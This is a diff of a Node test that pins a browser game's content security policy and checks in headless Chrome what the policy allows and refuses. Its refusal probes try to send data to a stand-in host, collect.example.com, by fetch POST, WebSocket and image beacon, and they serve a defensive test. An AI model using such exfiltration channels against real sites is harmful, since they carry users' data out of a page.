@@ -1,9 +1,8 @@
 #!/usr/bin/env node
-// Checks the page's content security policy (the meta in index.html; SECURITY.md, point 7): code only from this
-// site, the page's own inline scripts by their hashes, and PeerJS's pinned file (net.js's PEERJS); contact only
-// this site and PeerJS's broker. First the policy as written, then in headless Chrome (tools/browser.js): the page
-// starts and plays with nothing refused, while code or contact from anywhere else is refused. That the real PeerJS
-// file and broker work under it is shown by an online round on the PR's preview, not here (no network in a suite).
+// Checks the page's content security policy (what it is for: SECURITY.md, point 7): first the policy as written,
+// pinned whole, then in headless Chrome (tools/browser.js) the page starting and playing with nothing refused, and
+// what the policy must refuse refused. That the real PeerJS file and broker work under it is shown by an online
+// round on the PR's preview, not here (no network in a suite).
 //
 //   node tools/csp-test.js
 const fs = require('fs');
@@ -25,20 +24,28 @@ const first = html.search(/<script|<link rel="stylesheet"|<style/);
 check(at < first, 'it comes before every script and stylesheet (a policy governs only what follows it)');
 const policy = Object.fromEntries((metas[0]?.[1] || '').split(';').map(d => d.trim().split(/\s+/)).filter(d => d[0]).map(([k, ...v]) => [k, v]));
 const same = (a = [], b) => a.length === b.length && b.every(x => a.includes(x));
-check(same(policy['default-src'], ["'none'"]), "default-src is 'none': whatever it doesn't name is refused", policy['default-src']?.join(' '));
-
 const inline = [...html.matchAll(/<script(?![^>]*\ssrc=)[^>]*>([\s\S]*?)<\/script\s*>/gi)].map(m => `'sha256-${crypto.createHash('sha256').update(m[1]).digest('base64')}'`);
-const scripts = policy['script-src'] || [];
-const hashes = scripts.filter(s => s.startsWith("'sha"));
-const others = scripts.filter(s => !s.startsWith("'sha"));
-check(same(others, ["'self'", PEERJS]), "script-src names only 'self' and net.js's PEERJS, exactly", others.join(' '));
-check(same(hashes, inline), "script-src holds the hash of every inline script, and no other",
-  same(hashes, inline) ? '' : `in the policy, put: ${inline.join(' ')}`);
-check(same(policy['connect-src'], ["'self'", ...BROKER]), "connect-src names only 'self' and PeerJS's broker", policy['connect-src']?.join(' '));
-check(!/'unsafe-eval'|'unsafe-hashes'|'strict-dynamic'/.test(metas[0]?.[1] || ''), 'nothing lets code be built from text');
-check(!Object.entries(policy).some(([k, v]) => k !== 'style-src' && v.includes("'unsafe-inline'")), "'unsafe-inline' only for styles (the markup's style attributes)");
-check(!Object.entries(policy).some(([k, v]) => k !== 'img-src' && k !== 'child-src' && v.some(s => /^(\*|https?:|wss?:|data:|blob:)$/.test(s))),
-  'no wildcard or whole scheme, except data: images and the blob: worker (keepTimeWhileHidden in game/core.js)');
+// The whole policy, each directive with exactly these sources: one added, dropped or widened fails here, so the
+// change is made on purpose, in this file too, and its PR says why.
+const PINNED = {
+  'default-src': ["'none'"],                     // (whatever it doesn't name is refused)
+  'script-src': ["'self'", PEERJS, ...inline],   // (PeerJS's exact file, as net.js loads it; the inline scripts by hash)
+  'connect-src': ["'self'", ...BROKER],
+  'style-src': ["'self'", "'unsafe-inline'"],    // (the markup's style attributes)
+  'font-src': ["'self'"],
+  'img-src': ["'self'", 'data:'],                // (the HUD's data: dots)
+  'child-src': ["'self'", 'blob:'],              // (the service worker and keepTimeWhileHidden's blob: worker in game/core.js)
+  'frame-src': ["'none'"],                       // (no frames, though child-src would let some in)
+  'base-uri': ["'none'"],
+  'form-action': ["'none'"],
+};
+for (const [k, want] of Object.entries(PINNED)) {
+  const got = policy[k];
+  check(same(got, want), `${k} is ${k === 'script-src' ? "'self', PeerJS's file and the inline scripts' hashes" : want.join(' ')}`,
+    same(got, want) ? '' : `it has ${got ? got.join(' ') : 'none'}${k === 'script-src' ? `; the inline scripts' hashes: ${inline.join(' ')}` : ''}`);
+}
+const extra = Object.keys(policy).filter(k => !(k in PINNED));
+check(!extra.length, 'no other directive (one such as script-src-elem would override these)', extra.join(', '));
 check(!/<[a-z][^>]*\son[a-z]+=/i.test(html), 'no inline event handler in index.html (the policy refuses them)');
 const loaded = [...html.matchAll(/<script src="([^"]+)"/g)].map(m => m[1]);
 const building = loaded.filter(f => /\beval\(|new Function\b|set(Timeout|Interval)\(\s*['"`]/.test(fs.readFileSync(path.join(root, f), 'utf8')));
@@ -64,6 +71,8 @@ const WATCH = `window.__refused = []; addEventListener('securitypolicyviolation'
       'the page takes this browser as new enough (its check runs under the policy)');
     check(await ev(`Promise.race([navigator.serviceWorker.ready.then(() => true), new Promise(r => setTimeout(r, 5000, false))])`), 'the service worker starts');
     await ev(`document.getElementById('watch').click(), SnakeDebug.frames(80), 'ok'`);
+    check(await ev(`document.fonts.ready.then(() => [...document.fonts].some(f => f.family.replace(/"/g, '') === 'Fredoka' && f.status === 'loaded'))`),
+      'the lettering, Fredoka, loads from this site');
     check(await ev(`SnakeDebug.state() === 'running' && SnakeDebug.game().tick > 0`), 'a round plays');
     check(await ev(`keepTimeWhileHidden(true), !!hiddenClock`), "a hidden host's clock starts (a blob: worker)");
     await ev(`new Promise(r => { hiddenClock.onmessage = () => r(); setTimeout(r, 1000); }).then(() => keepTimeWhileHidden(false))`);
@@ -75,7 +84,9 @@ const WATCH = `window.__refused = []; addEventListener('securitypolicyviolation'
       functionDeclaration: `function (src) { const s = document.createElement('script'); s.src = src; document.head.append(s); fetch('https://0.peerjs.com/peerjs/id').catch(() => {}); }` });
     await b.sleep(500);
     check(asked.includes(PEERJS) && asked.some(u => u.startsWith('https://0.peerjs.com/')), "PeerJS's file and broker are let through", asked.join(', '));
-    check(await ev(`(() => { const w = new WebSocket('wss://0.peerjs.com/peerjs'); w.close(); return __refused.length === 0; })()`), "PeerJS's broker's socket is let through");
+    await ev(`(() => { const w = new WebSocket('wss://0.peerjs.com/peerjs'); w.onerror = () => {}; setTimeout(() => w.close(), 100); return 'ok'; })()`);
+    await b.sleep(300); // (a refusal comes after the call that opens the socket, never during it)
+    check(await ev(`__refused.length === 0`), "PeerJS's broker's socket is let through", await ev(`__refused.join('; ')`));
 
     // What it refuses.
     const refused = async (what, js, directive) => {
@@ -91,6 +102,8 @@ const WATCH = `window.__refused = []; addEventListener('securitypolicyviolation'
     await refused('another of PeerJS\'s versions from the same site', `new Promise(r => { const s = document.createElement('script'); s.src = 'https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.4/peerjs.min.js'; s.onload = () => r(true); s.onerror = () => r(false); document.head.append(s); })`, 'script-src');
     await refused('sending to another site', `fetch('https://collect.example.com/?d=1', { method: 'POST', body: 'x' }).then(() => true, () => false)`, 'connect-src');
     await refused('a socket to another site', `(() => { try { new WebSocket('wss://collect.example.com/'); } catch {} return false; })()`, 'connect-src');
+    await refused('a stylesheet from another site', `new Promise(r => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://fonts.example.com/x.css'; l.onload = () => r(true); l.onerror = () => r(false); document.head.append(l); })`, 'style-src');
+    await refused('a frame, even of this site', `(() => { const f = document.createElement('iframe'); f.src = location.href; document.body.append(f); setTimeout(() => f.remove(), 150); return false; })()`, 'frame-src');
     await refused('an image from another site (a way to send)', `new Promise(r => { const i = new Image(); i.onload = () => r(true); i.onerror = () => r(false); i.src = 'https://collect.example.com/p.gif?d=1'; })`, 'img-src');
   } finally {
     await b.close();
